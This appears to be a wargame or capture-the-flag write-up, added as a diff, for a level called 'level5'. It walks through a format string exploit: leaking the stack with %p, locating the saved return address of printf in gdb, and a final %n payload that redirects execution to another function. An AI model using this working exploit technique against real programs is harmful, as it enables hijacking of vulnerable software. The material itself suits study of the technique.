@@ -1,0 +1,33 @@
+Same as the 3 last level, we saw in asm that the exec
+make a call to printf.
+We also see that a function make a syscall but it isn't call
+We must write the o function's address at the printf's return address
+
+Let's find the address who is used by printf.
+
+python -c 'print "AAAA" + "%p "*20' | ./level5
+AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 
+0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 
+
+so it's the 4th
+
+python -c 'print "AAAA" + "%4$p"' | ./level5
+AAAA0x41414141
+
+then we need the printf's return address 
+
+so with gdb we run the exec with some random param.
+when the printf is call we make an info frame to see the saved registers:
+
+(gdb) info frame
+Stack level 0, frame at 0xbffff500:
+ eip = 0x8048380 in printf@plt; saved eip 0x80484f8
+ called by frame at 0xbffff720
+ Arglist at 0xbffff4f8, args:
+ Locals at 0xbffff4f8, Previous frame's sp is 0xbffff500
+ Saved registers:
+  eip at 0xbffff4fc
+
+the printf call address is 0x80484a4
+
+exploit : (python -c 'print "\xfc\xf4\xff\xbf%134513824x"+"%4$n"';cat) | ./level5
